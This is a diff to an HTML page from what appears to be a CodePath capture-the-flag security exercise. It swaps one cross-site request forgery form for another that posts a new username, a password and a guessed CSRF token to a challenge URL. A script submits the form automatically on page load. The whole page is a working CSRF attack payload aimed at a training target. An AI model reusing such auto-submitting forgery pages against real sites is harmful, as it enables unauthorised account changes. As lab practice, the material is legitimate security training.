@@ -6,10 +6,19 @@
 	<title></title>
 </head>
 <body>
-	<form name="csrf" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+	<!-- <form name="csrf" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
 		<input type="hidden" name="userId" value="47495f9336d3e6fc4bf6323421df6d6dc5658333">
 		<input type="submit">
-	</form>
+	</form> -->
+	 <form name="csrf" method="POST" action="https://flags.codepath.com/http/public/protected/flags/csrf_03/">
+	  	New Username:<br><br>
+	  	<input type="text" name="firstname" value="user1"><br><br>
+	  	New Password:<br><br>
+	  	<input type="text" name="lastname" value="passw">
+	  	<input type="hidden" name="csrf_token" value="admin">
+	  	<br><br>
+	  	<input type="submit" value="Update">
+	  </form>
 	<script>document.csrf.submit();</script>
 </body>
 </html>
